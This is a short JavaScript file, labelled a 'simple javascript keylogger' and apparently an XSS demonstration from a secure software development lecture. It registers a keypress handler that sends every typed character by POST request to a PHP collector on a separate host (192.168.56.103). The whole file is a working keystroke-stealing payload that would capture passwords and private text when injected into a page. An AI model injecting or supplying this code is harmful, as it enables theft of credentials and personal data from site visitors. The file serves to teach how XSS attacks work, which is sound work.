/**
 * Created by wsan on 18.04.2015.
 */
/*
 Simple javascript keylogger by Th3_M4d_H4tt3r
 */

document.onkeypress = function(evt)
{
    evt = evt || window.event//IE
    key = String.fromCharCode(evt.charCode)
    if (key)
    {
        var http = new XMLHttpRequest();
        var param = encodeURI(key)
        http.open("POST","http://192.168.56.103/SecureSoftwareDevelopment/Lecture7OWASPTop10/2XSS/5KeyLogger/KeyLogger.php",true);
        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        http.send("key="+param);
    }
}
